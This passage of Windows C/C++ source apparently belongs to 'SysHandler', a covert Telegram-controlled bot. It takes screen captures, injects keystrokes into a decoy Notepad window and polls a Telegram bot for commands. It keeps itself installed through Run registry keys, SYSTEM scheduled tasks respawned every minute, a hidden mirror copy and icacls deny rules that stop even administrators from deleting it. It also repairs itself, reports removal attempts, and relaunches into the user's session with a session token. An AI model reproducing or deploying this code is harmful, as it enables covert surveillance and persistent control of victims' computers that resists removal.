                                   PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
            if (!p) continue;
            HANDLE ms = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, pe.th32ProcessID);
            if (ms != INVALID_HANDLE_VALUE)
            {
                MODULEENTRY32W me;
                me.dwSize = sizeof(me);
                if (Module32FirstW(ms, &me))
                {
                    do
                    {
                        if (lstrcmpiW(me.szModule, L"SysHandler.dll") == 0)
                        {
                            TerminateProcess(p, 1);
                            break;
                        }
                    } while (Module32NextW(ms, &me));
                }
                CloseHandle(ms);
            }
            CloseHandle(p);
        } while (Process32NextW(ss, &pe));
    }
    CloseHandle(ss);
}

static void WaitBotMutexGone()
{
    for (int i = 0; i < 40; ++i)
    {
        HANDLE probe = OpenMutexW(SYNCHRONIZE, FALSE, L"Global\\SysHandlerDllInstance");
        if (!probe) return;
        CloseHandle(probe);
        Sleep(250);
    }
}

static void PsSpawn(const char* b64)
{
    char cmd[2600];
    cmd[0] = 0;
    HealAppend(cmd, sizeof(cmd), "powershell.exe -NoProfile -EncodedCommand ");
    HealAppend(cmd, sizeof(cmd), b64);
    HealSpawn(cmd);
}

static void IcaclsDeny1(const char* path, const char* who, const char* rights)
{
    char cmd[MAX_PATH * 3];
    cmd[0] = 0;
    HealAppend(cmd, sizeof(cmd), "icacls \"");
    HealAppend(cmd, sizeof(cmd), path);
    HealAppend(cmd, sizeof(cmd), "\" /deny \"");
    HealAppend(cmd, sizeof(cmd), who);
    HealAppend(cmd, sizeof(cmd), rights);
    HealAppend(cmd, sizeof(cmd), "\"");
    HealSpawn(cmd);
}

static void ReArmIcacls(const char* dir, const char* f1, const char* f2)
{
    static const char* kSids[] = { "*S-1-1-0", "*S-1-5-32-544", "*S-1-5-18" };
    char user[128];
    DWORD uc = (DWORD)sizeof(user);
    user[0] = 0;
    GetUserNameA(user, &uc);
    for (int i = 0; i < 3; ++i)
    {
        IcaclsDeny1(dir, kSids[i], ":(OI)(CI)(D)");
        IcaclsDeny1(dir, kSids[i], ":(DC)");
        IcaclsDeny1(f1, kSids[i], ":(D)");
        IcaclsDeny1(f2, kSids[i], ":(D)");
    }
    if (user[0])
    {
        IcaclsDeny1(dir, user, ":(OI)(CI)(D)");
        IcaclsDeny1(dir, user, ":(DC)");
        IcaclsDeny1(f1, user, ":(D)");
        IcaclsDeny1(f2, user, ":(D)");
    }
}

static BOOL RepairMainFromMirror(const char* mainD,
                                 const char* mirExe, const char* mirDll,
                                 const char* fpExe, const char* fpDll)
{
    char mainExe[MAX_PATH * 2];
    mainExe[0] = 0;
    HealAppend(mainExe, sizeof(mainExe), mainD);
    HealAppend(mainExe, sizeof(mainExe), "\\SysHandler.exe");
    char mainDll[MAX_PATH * 2];
    mainDll[0] = 0;
    HealAppend(mainDll, sizeof(mainDll), mainD);
    HealAppend(mainDll, sizeof(mainDll), "\\SysHandler.dll");
    BOOL need = (GetFileAttributesA(mainD) == INVALID_FILE_ATTRIBUTES);
    if (!need) need = FileMissingOrBad(mainExe, fpExe);
    if (!need) need = FileMissingOrBad(mainDll, fpDll);
    if (!need) return TRUE;
    if (!CreateDirectoryA(mainD, NULL) &&
        GetFileAttributesA(mainD) == INVALID_FILE_ATTRIBUTES) return FALSE;
    KillBotHosts();
    WaitBotMutexGone();
    BOOL ok = TRUE;
    if (FileMissingOrBad(mainExe, fpExe))
    {
        if (!FileHashOk(mirExe, fpExe) || !CopyOver(mirExe, mainExe)) ok = FALSE;
    }
    if (FileMissingOrBad(mainDll, fpDll))
    {
        if (!FileHashOk(mirDll, fpDll) || !CopyOver(mirDll, mainDll)) ok = FALSE;
    }
    if (!ok) return FALSE;
    SetFileAttributesA(mainD, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
    ReArmIcacls(mainD, mainExe, mainDll);
    LogLine(L"dll", L"mirror repair: install rebuilt from the mirror copy", 0);
    return TRUE;
}

static BOOL HealRunValue(HKEY root, const char* exeP)
{
    HKEY k = NULL;
    if (RegOpenKeyExA(root,
                      "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                      0, KEY_QUERY_VALUE | KEY_SET_VALUE, &k) != ERROR_SUCCESS)
        return FALSE;
    BYTE v[MAX_PATH * 2];
    DWORD cb = sizeof(v);
    DWORD ty = 0;
    BOOL have = FALSE;
    if (RegQueryValueExA(k, "SysHandler", NULL, &ty, v, &cb) == ERROR_SUCCESS
        && ty == REG_SZ)
    {
        v[cb < sizeof(v) ? cb : sizeof(v) - 1] = 0;
        have = (strstr((const char*)v, exeP) != NULL);
    }
    if (!have)
    {
        char want[MAX_PATH * 2];
        want[0] = 0;
        HealAppend(want, sizeof(want), "\"");
        HealAppend(want, sizeof(want), exeP);
        HealAppend(want, sizeof(want), "\"");
        if (RegSetValueExA(k, "SysHandler", 0, REG_SZ, (const BYTE*)want,
                           (DWORD)strlen(want) + 1) == ERROR_SUCCESS)
            LogLine(L"dll", L"self heal: Run autostart value restored", 0);
        RegCloseKey(k);
        return TRUE;
    }
    RegCloseKey(k);
    return FALSE;
}

static void HealPersist()
{
    char selfP[MAX_PATH * 2];
    DWORD sl = GetModuleFileNameA(g_selfModule, selfP, (DWORD)sizeof(selfP));
    if (!sl || sl >= sizeof(selfP)) return;
    char dir[MAX_PATH * 2];
    lstrcpynA(dir, selfP, (int)sizeof(dir));
    char* cut = strrchr(dir, '\\');
    if (!cut) return;
    *cut = 0;
    char pd[MAX_PATH * 2];
    DWORD pl = GetEnvironmentVariableA("ProgramData", pd, (DWORD)sizeof(pd));
    if (!pl || pl >= sizeof(pd)) return;
    char inst[MAX_PATH * 2];
    inst[0] = 0;
    HealAppend(inst, sizeof(inst), pd);
    HealAppend(inst, sizeof(inst), "\\SysHandler");
    if (lstrcmpiA(dir, inst) != 0) return;
    char flag[MAX_PATH * 2];
    flag[0] = 0;
    HealAppend(flag, sizeof(flag), inst);
    HealAppend(flag, sizeof(flag), "\\uninstall.flag");
    if (GetFileAttributesA(flag) != INVALID_FILE_ATTRIBUTES)
    {
        g_stop = 1;
        LogLine(L"dll", L"uninstall flag seen - staying dead, no self heal", 0);
        return;
    }
    static DWORD sLastHeal = 0;
    DWORD now = GetTickCount();
    if (sLastHeal && (DWORD)(now - sLastHeal) < 60000) return;
    sLastHeal = now;
    char exeP[MAX_PATH * 2];
    exeP[0] = 0;
    HealAppend(exeP, sizeof(exeP), inst);
    HealAppend(exeP, sizeof(exeP), "\\SysHandler.exe");
    if (GetFileAttributesA(exeP) == INVALID_FILE_ATTRIBUTES) return;
    char dllP[MAX_PATH * 2];
    dllP[0] = 0;
    HealAppend(dllP, sizeof(dllP), inst);
    HealAppend(dllP, sizeof(dllP), "\\SysHandler.dll");
    char mirrorD[MAX_PATH * 2];
    mirrorD[0] = 0;
    HealAppend(mirrorD, sizeof(mirrorD), pd);
    HealAppend(mirrorD, sizeof(mirrorD), "\\SvcCache");
    char mirExe[MAX_PATH * 2];
    mirExe[0] = 0;
    HealAppend(mirExe, sizeof(mirExe), mirrorD);
    HealAppend(mirExe, sizeof(mirExe), "\\SysHandler.exe");
    char mirDll[MAX_PATH * 2];
    mirDll[0] = 0;
    HealAppend(mirDll, sizeof(mirDll), mirrorD);
    HealAppend(mirDll, sizeof(mirDll), "\\SysHandler.dll");

    {
        static BOOL sRunOk = FALSE;
        BOOL fixedRun = HealRunValue(HKEY_CURRENT_USER, exeP);
        if (HealRunValue(HKEY_LOCAL_MACHINE, exeP)) fixedRun = TRUE;
        if (!fixedRun)
            sRunOk = TRUE;
        else if (sRunOk)
        {
            sRunOk = FALSE;
            TamperReport("someone removed my autostart entry");
        }
    }

    char win[MAX_PATH];
    UINT wl = GetWindowsDirectoryA(win, sizeof(win));
    if (!wl || wl >= sizeof(win)) return;

    static BOOL sWatchSeen = FALSE;
    static BOOL sFallSeen  = FALSE;
    BOOL watchHere = HealTaskVisible(win, "SysHandler Watchdog");
    BOOL fallHere  = HealTaskVisible(win, "SysHandler Fallback");
    BOOL watchGone = FALSE;
    BOOL fallGone  = FALSE;
    if (watchHere) sWatchSeen = TRUE;
    else if (sWatchSeen) { sWatchSeen = FALSE; watchGone = TRUE; }
    if (fallHere) sFallSeen = TRUE;
    else if (sFallSeen) { sFallSeen = FALSE; fallGone = TRUE; }
    if (watchGone || fallGone)
        TamperReport("someone deleted my startup tasks");

    if (!watchHere)
    {
        PsSpawn(kPsLiftB64);
        char cmd[MAX_PATH * 4];
        cmd[0] = 0;
        HealAppend(cmd, sizeof(cmd),
                   "schtasks /create /f /tn \"SysHandler Watchdog\" /tr \"\\\"");
        HealAppend(cmd, sizeof(cmd), mirExe);
        HealAppend(cmd, sizeof(cmd), "\\\" /revive\" /sc minute /mo 1 /ru SYSTEM");
        HealSpawn(cmd);
        PsSpawn(kPsArmB64);
        LogLine(L"dll", L"self heal: watchdog task respawn requested", 0);
    }
    if (!fallHere)
    {
        PsSpawn(kPsLiftB64);
        char sysd[MAX_PATH];
        UINT sl2 = GetSystemDirectoryA(sysd, sizeof(sysd));
        if (sl2 && sl2 < sizeof(sysd))
        {
            char cmd[MAX_PATH * 4];
            cmd[0] = 0;
            HealAppend(cmd, sizeof(cmd),
                       "schtasks /create /f /tn \"SysHandler Fallback\" /tr \"\\\"");
            HealAppend(cmd, sizeof(cmd), sysd);
            HealAppend(cmd, sizeof(cmd), "\\rundll32.exe\\\" \\\"");
            HealAppend(cmd, sizeof(cmd), selfP);
            HealAppend(cmd, sizeof(cmd), "\\\",Revive\" /sc minute /mo 3 /ru SYSTEM");
            HealSpawn(cmd);
            PsSpawn(kPsArmB64);
            LogLine(L"dll", L"self heal: fallback task respawn requested", 0);
        }
    }
    char fpExe[65];
    char fpDll[65];
    BOOL fp = ReadFingerprint("ExeHash", fpExe) && ReadFingerprint("DllHash", fpDll);
    if (fp)
    {
        char got[65];
        BOOL pristine = Sha256FileA(exeP, got) && lstrcmpiA(got, fpExe) == 0;
        if (pristine)
        {
            char got2[65];
            pristine = Sha256FileA(dllP, got2) && lstrcmpiA(got2, fpDll) == 0;
        }
        if (pristine && (FileMissingOrBad(mirExe, fpExe) ||
                         FileMissingOrBad(mirDll, fpDll)))
        {
            CreateDirectoryA(mirrorD, NULL);
            BOOL ok = TRUE;
            if (FileMissingOrBad(mirExe, fpExe)) ok = CopyOver(exeP, mirExe) && ok;
            if (FileMissingOrBad(mirDll, fpDll)) ok = CopyOver(dllP, mirDll) && ok;
            if (ok)
            {
                SetFileAttributesA(mirrorD,
                                   FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
                ReArmIcacls(mirrorD, mirExe, mirDll);
                LogLine(L"dll", L"self heal: mirror copy refreshed from the install", 0);
            }
        }
    }
}

static void EnableModernTls()
{
    DWORD lvlFull = INTERNET_FLAG_SECURE_PROTOCOL_TLS1_2 |
                    INTERNET_FLAG_SECURE_PROTOCOL_TLS1_3;
    DWORD lvlSafe = INTERNET_FLAG_SECURE_PROTOCOL_TLS1_2;
    if (InternetSetOptionA(NULL, INTERNET_OPTION_SECURE_PROTOCOL_LEVEL,
                           &lvlFull, sizeof(lvlFull)))
    {
        LogLine(L"dll", L"TLS 1.2-1.3 enabled for this process", 0);
        return;
    }
    if (InternetSetOptionA(NULL, INTERNET_OPTION_SECURE_PROTOCOL_LEVEL,
                           &lvlSafe, sizeof(lvlSafe)))
        LogLine(L"dll", L"TLS 1.2 enabled - 1.3 flag not accepted here", 0);
    else
        LogLine(L"dll", L"TLS option not accepted - using system default", 0);
}

static DWORD WINAPI TelegramThreadProc(LPVOID)
{
    LogLine(L"dll", L"telegram thread starting", 0);
    EnableModernTls();
    HealPersist();

    CreateThread(NULL, 0, SdWatchThreadProc, NULL, 0, NULL);

    if (!ProvisionValid())
    {
        LogLine(L"dll",
            L"not provisioned: put your bot token + chat id into syshandler.cpp, "
            L"recompile, and let the watchdog relaunch me - idling", 0);
        while (!g_stop) SleepBot(30000);
        LogLine(L"dll", L"telegram thread ended (unprovisioned)", 0);
        return 0;
    }

    for (;;)
    {
        if (g_stop) break;

        char path[384];
        wsprintfA(path, "/bot%s/getMe", kBotToken);
        char* resp = NULL; DWORD respLen = 0, status = 0;
        if (!HttpPost(kApiBase, path, "application/x-www-form-urlencoded",
                      "", 0, &resp, &respLen, &status))
        {
            LogLine(L"dll", L"getMe failed - retrying in 15 s", 0);
            SleepBot(15000);
            continue;
        }
        if (status == 401)
        {
            LogLine(L"dll", L"TOKEN REJECTED (401) - check the baked token - "
                            L"retrying in 30 min", 0);
            FreeResp(&resp);
            SleepBot(1800000);
            continue;
        }
        if (!resp || !strstr(resp, "\"ok\":true"))
        {
            LogLine(L"dll", L"getMe unexpected answer - retry in 15 s", 0);
            FreeResp(&resp);
            SleepBot(15000);
            continue;
        }
        char botName[64] = "?";
        JsonGetString(resp, "username", botName, sizeof(botName));
        FreeResp(&resp);

        LogLine(L"dll", L"connected - polling for commands", 0);

        TgSendText("System Started Now");
        LogLine(L"dll", L"startup notification sent (System Started Now)", 0);

        TamperStartupCheck();
        TamperBeat();

        while (!g_stop)
        {
            HealPersist();
            TamperBeat();
            char body[64];
            wsprintfA(body, "offset=%lu&timeout=25", g_lastUpdate);
            wsprintfA(path, "/bot%s/getUpdates", kBotToken);
            char* upd = NULL; DWORD ulen = 0, ustatus = 0;
            if (!HttpPost(kApiBase, path, "application/x-www-form-urlencoded",
                          body, (DWORD)strlen(body), &upd, &ulen, &ustatus))
            {
                LogLine(L"dll", L"poll failed - retry in 15 s", 0);
                SleepBot(15000);
                continue;
            }
            if (ustatus == 409)
            {
                LogLine(L"dll", L"409 conflict: another client polls this bot", 0);
                SleepBot(15000);
            }
            else if (upd && ustatus == 200)
            {
                unsigned long before = g_lastUpdate;
                ProcessUpdates(upd);
                if (g_lastUpdate == before)
                    SleepBot(1000);

            }
            else if (ustatus == 401)
            {
                LogLine(L"dll", L"token revoked (401) - reconnecting", 0);
                FreeResp(&upd);
                break;
            }
            FreeResp(&upd);
        }
    }

    LogLine(L"dll", L"telegram thread ended", 0);
    return 0;
}

extern "C" __declspec(dllexport)
BOOL CALLBACK CaptureNow(HWND, HINSTANCE, LPSTR, int)
{
    LogLine(L"dll", L"CaptureNow: self test - one capture, RAM only", 0);

    unsigned char* png = NULL;
    DWORD len = 0;
    BOOL ok = CaptureScreenToMemory(&png, &len) ? TRUE : FALSE;
    if (ok && (!png || len < 8 || png[0] != 0x89 || png[1] != 'P' ||
               png[2] != 'N' || png[3] != 'G'))
    {
        LogLine(L"dll", L"self test: buffer is not a valid PNG", 0);
        ok = FALSE;
    }
    if (ok)
        LogLine(L"dll", L"self test PASSED: PNG built in RAM, freed again", 0);
    if (png) free(png);
    return ok;
}

extern "C" __declspec(dllexport)
BOOL CALLBACK StartTelegram(HWND, HINSTANCE, LPSTR, int)
{
    if (g_thread)
    {
        LogLine(L"dll", L"StartTelegram: already running in this process", 0);
        return TRUE;
    }

    g_singleInst = CreateMutexW(NULL, TRUE, L"Global\\SysHandlerDllInstance");
    DWORD gle = GetLastError();
    if (g_singleInst && gle == ERROR_ALREADY_EXISTS)
    {
        CloseHandle(g_singleInst);
        g_singleInst = NULL;
        LogLine(L"dll", L"StartTelegram: another instance runs - exiting (mutex)", 0);
        return FALSE;
    }

    g_stop   = 0;
    g_thread = CreateThread(NULL, 0, TelegramThreadProc, NULL, 0, NULL);
    if (!g_thread)
    {
        LogLine(L"dll", L"StartTelegram: CreateThread failed", 0);
        return FALSE;
    }
    LogLine(L"dll", L"StartTelegram: thread created", 0);

    WaitForSingleObject(g_thread, INFINITE);

    CloseHandle(g_thread);
    g_thread = NULL;
    if (g_singleInst)
    {
        ReleaseMutex(g_singleInst);
        CloseHandle(g_singleInst);
        g_singleInst = NULL;
    }
    LogLine(L"dll", L"StartTelegram: loop ended, returning to host", 0);
    return TRUE;
}

typedef DWORD (WINAPI *WtsGetConsoleFn)(VOID);
typedef BOOL (WINAPI *WtsQueryUserTokFn)(DWORD, PHANDLE);

extern "C" __declspec(dllexport)
BOOL CALLBACK EnsureBotRunning(HWND, HINSTANCE, LPSTR, int)
{
    char selfP[MAX_PATH * 2];
    DWORD sl = GetModuleFileNameA(g_selfModule, selfP, (DWORD)sizeof(selfP));
    if (!sl || sl >= sizeof(selfP)) return FALSE;
    char selfDir[MAX_PATH * 2];
    lstrcpynA(selfDir, selfP, (int)sizeof(selfDir));
    char* cut = strrchr(selfDir, '\\');
    if (!cut) return FALSE;
    *cut = 0;
    char pd[MAX_PATH * 2];
    DWORD pl = GetEnvironmentVariableA("ProgramData", pd, (DWORD)sizeof(pd));
    if (!pl || pl >= sizeof(pd)) return FALSE;
    char mainD[MAX_PATH * 2];
    mainD[0] = 0;
    HealAppend(mainD, sizeof(mainD), pd);
    HealAppend(mainD, sizeof(mainD), "\\SysHandler");
    char mirrorD[MAX_PATH * 2];
    mirrorD[0] = 0;
    HealAppend(mirrorD, sizeof(mirrorD), pd);
    HealAppend(mirrorD, sizeof(mirrorD), "\\SvcCache");
    BOOL fromMain = (lstrcmpiA(selfDir, mainD) == 0);
    BOOL fromMirror = (lstrcmpiA(selfDir, mirrorD) == 0);
    if (!fromMain && !fromMirror) return FALSE;
    char flagP[MAX_PATH * 2];
    flagP[0] = 0;
    HealAppend(flagP, sizeof(flagP), mainD);
    HealAppend(flagP, sizeof(flagP), "\\uninstall.flag");
    if (GetFileAttributesA(flagP) != INVALID_FILE_ATTRIBUTES) return FALSE;
    char flagM[MAX_PATH * 2];
    flagM[0] = 0;
    HealAppend(flagM, sizeof(flagM), mirrorD);
    HealAppend(flagM, sizeof(flagM), "\\uninstall.flag");
    if (GetFileAttributesA(flagM) != INVALID_FILE_ATTRIBUTES) return FALSE;
    char mainExe[MAX_PATH * 2];
    mainExe[0] = 0;
    HealAppend(mainExe, sizeof(mainExe), mainD);
    HealAppend(mainExe, sizeof(mainExe), "\\SysHandler.exe");
    char mainDll[MAX_PATH * 2];
    mainDll[0] = 0;
    HealAppend(mainDll, sizeof(mainDll), mainD);
    HealAppend(mainDll, sizeof(mainDll), "\\SysHandler.dll");
    char mirExe[MAX_PATH * 2];
    mirExe[0] = 0;
    HealAppend(mirExe, sizeof(mirExe), mirrorD);
    HealAppend(mirExe, sizeof(mirExe), "\\SysHandler.exe");
    char mirDll[MAX_PATH * 2];
    mirDll[0] = 0;
    HealAppend(mirDll, sizeof(mirDll), mirrorD);
    HealAppend(mirDll, sizeof(mirDll), "\\SysHandler.dll");
    char fpExe[65];
    char fpDll[65];
    BOOL fp = ReadFingerprint("ExeHash", fpExe) && ReadFingerprint("DllHash", fpDll);
    if (!fp)
    {
        fpExe[0] = 0;
        fpDll[0] = 0;
    }
    if (fromMain)
    {
        BOOL tampered = FALSE;
        if (fp)
        {
            char got[65];
            if (!Sha256FileA(mainExe, got) || lstrcmpiA(got, fpExe) != 0) tampered = TRUE;
            else if (!Sha256FileA(mainDll, got) || lstrcmpiA(got, fpDll) != 0) tampered = TRUE;
        }
        if (tampered)
        {
            LogLine(L"dll", L"tripwire: install hash mismatch - handing repair to the mirror", 0);
            if (GetFileAttributesA(mirExe) != INVALID_FILE_ATTRIBUTES)
            {
                char cmd[MAX_PATH * 2];
                cmd[0] = 0;
                HealAppend(cmd, sizeof(cmd), "\"");
                HealAppend(cmd, sizeof(cmd), mirExe);
                HealAppend(cmd, sizeof(cmd), "\" /revive");
                STARTUPINFOA si2;
                PROCESS_INFORMATION pi2;
                memset(&si2, 0, sizeof(si2));
                si2.cb = sizeof(si2);
                si2.dwFlags = STARTF_USESHOWWINDOW;
                si2.wShowWindow = SW_HIDE;
                memset(&pi2, 0, sizeof(pi2));
                if (CreateProcessA(NULL, (LPSTR)cmd, NULL, NULL, FALSE,
                                   CREATE_NO_WINDOW, NULL, NULL, &si2, &pi2))
                {
                    CloseHandle(pi2.hThread);
                    CloseHandle(pi2.hProcess);
                }
            }
            return FALSE;
        }
        if (!fp) WriteFingerprints(mainExe, mainDll);
    }
    else
    {
        BOOL repaired = RepairMainFromMirror(mainD, mirExe, mirDll,
                                             fpExe, fpDll);
        if (!repaired)
        {
            LogLine(L"dll", L"mirror repair failed - refusing to spawn unverified binaries", 0);
            if (fp && (!FileHashOk(mirExe, fpExe) || !FileHashOk(mirDll, fpDll)))
                return FALSE;
        }
        else if (!fp)
        {
            WriteFingerprints(mainExe, mainDll);
        }
    }
    HANDLE probe = OpenMutexW(SYNCHRONIZE, FALSE, L"Global\\SysHandlerDllInstance");
    if (probe)
    {
        CloseHandle(probe);
        LogLine(L"dll", L"revive: bot already alive - nothing to do", 0);
        return TRUE;
    }
    WtsGetConsoleFn getCon = (WtsGetConsoleFn)GetProcAddress(
        GetModuleHandleW(L"kernel32.dll"), "WTSGetActiveConsoleSessionId");
    if (!getCon) return FALSE;
    DWORD sess = getCon();
    if (sess == 0 || sess == 0xFFFFFFFF) return FALSE;
    HMODULE wts = LoadLibraryW(L"wtsapi32.dll");
    if (!wts) return FALSE;
    WtsQueryUserTokFn qut = (WtsQueryUserTokFn)GetProcAddress(wts, "WTSQueryUserToken");
    BOOL got = FALSE;
    HANDLE tok = NULL;
    if (qut) got = qut(sess, &tok);
    FreeLibrary(wts);
    if (!got || !tok) return FALSE;
    const char* spawnExe = mainExe;
    if (GetFileAttributesA(mainExe) == INVALID_FILE_ATTRIBUTES) spawnExe = mirExe;
    char cmd[MAX_PATH * 2];
    cmd[0] = 0;
    HealAppend(cmd, sizeof(cmd), "\"");
    HealAppend(cmd, sizeof(cmd), spawnExe);
    HealAppend(cmd, sizeof(cmd), "\"");
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.lpDesktop = (LPSTR)"Winsta0\\Default";
    memset(&pi, 0, sizeof(pi));
    BOOL ok = CreateProcessAsUserA(tok, spawnExe, cmd, NULL, NULL, FALSE,
                                   CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    if (ok)
    {
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        LogLine(L"dll", L"revive: bot launched into the active console session", 0);
    }
    else
        LogLine(L"dll", L"revive: console session launch failed", 0);
    CloseHandle(tok);
    return ok;
}

extern "C" __declspec(dllexport)
BOOL CALLBACK Revive(HWND, HINSTANCE, LPSTR, int)
{
    return EnsureBotRunning(NULL, NULL, (LPSTR)"", 0);
}

extern "C" __declspec(dllexport)
void CALLBACK SysTestFeed(HWND, HINSTANCE, LPSTR json, int)
{
    EnableModernTls();               
    if (json && json[0]) ProcessUpdates(json);
}

struct TestKeysCtx { DWORD hold; DWORD delay; char spec[256]; };

static DWORD WINAPI TestKeysThreadProc(LPVOID p)
{
    TestKeysCtx* ctx = (TestKeysCtx*)p;
    static const char kCls[] = "SysHandlerKeyFeed";
    WNDCLASSA wc;
    memset(&wc, 0, sizeof(wc));
    wc.lpfnWndProc   = DefWindowProcA;
    wc.hInstance     = (HINSTANCE)g_selfModule;
    wc.lpszClassName = kCls;
    RegisterClassA(&wc);
    HWND w = CreateWindowExA(0, kCls, "Homework.docx - Notepad",
                             WS_OVERLAPPEDWINDOW | WS_VISIBLE,
                             40, 40, 560, 380, NULL, NULL, wc.hInstance, NULL);
    if (w)
    {
        ShowWindow(w, SW_SHOW);
        SetForegroundWindow(w);
        SetFocus(w);
        SetWindowPos(w, HWND_TOPMOST, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE);
    }
    MSG msg;
    const DWORD t0 = GetTickCount();
    while (GetTickCount() - t0 < ctx->hold)
    {
        while (w && PeekMessageA(&msg, NULL, 0, 0, PM_REMOVE))
        {
            TranslateMessage(&msg);
            DispatchMessageA(&msg);
        }
        if (ctx->spec[0] && GetTickCount() - t0 >= ctx->delay)
        {
            const char* q = ctx->spec;
            while (*q)
            {
                if (*q == '[')
                {
                    char tok[12];
                    int i = 0;
                    ++q;
                    while (*q && *q != ']' && i < 11) tok[i++] = *q++;
                    if (*q == ']') ++q;
                    tok[i] = 0;
                    UINT vk = 0;
                    if      (!lstrcmpiA(tok, "ENTER")) vk = VK_RETURN;
                    else if (!lstrcmpiA(tok, "BS"))    vk = VK_BACK;
                    else if (!lstrcmpiA(tok, "TAB"))   vk = VK_TAB;
                    else if (!lstrcmpiA(tok, "ESC"))   vk = VK_ESCAPE;
                    else if (!lstrcmpiA(tok, "DEL"))   vk = VK_DELETE;
                    else if (!lstrcmpiA(tok, "SPACE")) vk = VK_SPACE;
                    if (vk)
                    {
                        keybd_event((BYTE)vk, 0, 0, 0);
                        keybd_event((BYTE)vk, 0, KEYEVENTF_KEYUP, 0);
                        Sleep(40);
                    }
                }
                else
                {
                    SHORT s = VkKeyScanA(*q);
                    ++q;
                    if (s != -1)
                    {
                        BYTE vk = (BYTE)(s & 0xFF);
                        BOOL shift = (s & 0x100) != 0;
                        if (shift) keybd_event(VK_SHIFT, 0, 0, 0);
                        keybd_event(vk, 0, 0, 0);
                        keybd_event(vk, 0, KEYEVENTF_KEYUP, 0);
                        if (shift) keybd_event(VK_SHIFT, 0, KEYEVENTF_KEYUP, 0);
                        Sleep(40);
                    }
                }
            }
            ctx->spec[0] = 0;            
        }
        Sleep(15);
    }
    if (w) DestroyWindow(w);
    free(ctx);
    return 0;
}

extern "C" __declspec(dllexport)
void CALLBACK SysTestKeys(HWND, HINSTANCE, LPSTR spec, int)
{
    if (!spec || !spec[0]) return;
    TestKeysCtx* ctx = (TestKeysCtx*)malloc(sizeof(TestKeysCtx));
    if (!ctx) return;
    memset(ctx, 0, sizeof(*ctx));
    ctx->hold  = 2500;
    ctx->delay = 400;
    lstrcpynA(ctx->spec, spec, (int)sizeof(ctx->spec));
    const char* semi  = strchr(spec, ';');
    const char* semi2 = semi ? strchr(semi + 1, ';') : NULL;
    if (semi && semi2)
    {
        ctx->hold  = (DWORD)strtoul(spec, NULL, 10);
        ctx->delay = (DWORD)strtoul(semi + 1, NULL, 10);
        lstrcpynA(ctx->spec, semi2 + 1, (int)sizeof(ctx->spec));
    }
    if (ctx->hold < ctx->delay + 500) ctx->hold = ctx->delay + 500;
    HANDLE h = CreateThread(NULL, 0, TestKeysThreadProc, ctx, 0, NULL);
    if (h) CloseHandle(h);
    else free(ctx);
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD reason, LPVOID)
{
    switch (reason)
    {
    case DLL_PROCESS_ATTACH:
        DisableThreadLibraryCalls(hinstDLL);
        g_selfModule = hinstDLL;

        EnableDpiAwareness();
        break;
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

#elif defined(SYSHANDLER_BUILD_EXE)

int main(int argc, char** argv)
{
    bool once = false;
    bool revive = false;
    for (int i = 1; i < argc; ++i)
    {
        if (!lstrcmpiA(argv[i], "--once")) once = true;
        else if (!lstrcmpiA(argv[i], "/revive")) revive = true;
    }

    wchar_t dllPath[MAX_PATH];
    GetModuleFileNameW(NULL, dllPath, MAX_PATH);
    wchar_t* lastSlash = wcsrchr(dllPath, L'\\');
    if (!lastSlash) return 1;
    lstrcpyW(lastSlash + 1, L"SysHandler.dll");

    HMODULE hDll = LoadLibraryW(dllPath);
    if (!hDll) return 1;

    if (once)
    {
        typedef BOOL (CALLBACK *CaptureNowFn)(HWND, HINSTANCE, LPSTR, int);
        CaptureNowFn nowFn = (CaptureNowFn)GetProcAddress(hDll, "CaptureNow");
        if (!nowFn)
        {
            FreeLibrary(hDll);
            return 2;
        }
        BOOL ok = nowFn(NULL, NULL, (LPSTR)"", 0);
        FreeLibrary(hDll);
        return ok ? 0 : 3;
    }

    if (revive)
    {
        typedef BOOL (CALLBACK *EnsureFn)(HWND, HINSTANCE, LPSTR, int);
        EnsureFn ens = (EnsureFn)GetProcAddress(hDll, "EnsureBotRunning");
        if (!ens)
        {
            FreeLibrary(hDll);
            return 2;
        }
        BOOL ok = ens(NULL, NULL, (LPSTR)"", 0);
        FreeLibrary(hDll);
        return ok ? 0 : 5;
    }

    typedef BOOL (CALLBACK *StartTelegramFn)(HWND, HINSTANCE, LPSTR, int);
    StartTelegramFn bot = (StartTelegramFn)GetProcAddress(hDll, "StartTelegram");
    if (!bot)
    {
        FreeLibrary(hDll);
        return 2;
    }
    bot(NULL, NULL, (LPSTR)"", 0);
    FreeLibrary(hDll);
    return 0;
}

#endif
